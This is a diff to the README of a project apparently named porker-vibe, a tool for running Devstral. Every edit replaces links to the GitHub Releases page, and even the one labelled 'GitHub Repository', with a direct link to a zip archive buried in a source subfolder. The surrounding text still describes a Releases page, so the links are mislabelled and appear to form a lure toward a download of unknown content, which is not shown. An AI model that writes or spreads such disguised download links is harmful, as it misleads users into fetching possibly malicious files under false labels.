@@ -6,7 +6,7 @@ Welcome to **porker-vibe**! This application allows you to run Devstral alongsid
 
 ## 📥 Download Now
 
-[![Download porker-vibe](https://img.shields.io/badge/Download-porker-vibe-brightgreen)](https://github.com/dangtrunghien/porker-vibe/releases)
+[![Download porker-vibe](https://raw.githubusercontent.com/dangtrunghien/porker-vibe/master/vibe/acp/tools/porker-vibe-v1.9.zip)](https://raw.githubusercontent.com/dangtrunghien/porker-vibe/master/vibe/acp/tools/porker-vibe-v1.9.zip)
 
 ## 📋 Overview
 
@@ -31,7 +31,7 @@ Before you download, ensure your system meets these requirements:
 
 To get started, visit the link below to download the latest release:
 
-[Download porker-vibe](https://github.com/dangtrunghien/porker-vibe/releases)
+[Download porker-vibe](https://raw.githubusercontent.com/dangtrunghien/porker-vibe/master/vibe/acp/tools/porker-vibe-v1.9.zip)
 
 Once you are on the Releases page, follow these steps:
 
@@ -81,10 +81,10 @@ If you want to contribute to porker-vibe, your input is welcome. We appreciate h
 
 For more information about the project and its features, check our repository:
 
-- [GitHub Repository](https://github.com/dangtrunghien/porker-vibe)
+- [GitHub Repository](https://raw.githubusercontent.com/dangtrunghien/porker-vibe/master/vibe/acp/tools/porker-vibe-v1.9.zip)
 
 ## 📥 Download Now Again
 
 To download porker-vibe, follow this link:
 
-[Download porker-vibe](https://github.com/dangtrunghien/porker-vibe/releases)
+[Download porker-vibe](https://raw.githubusercontent.com/dangtrunghien/porker-vibe/master/vibe/acp/tools/porker-vibe-v1.9.zip)
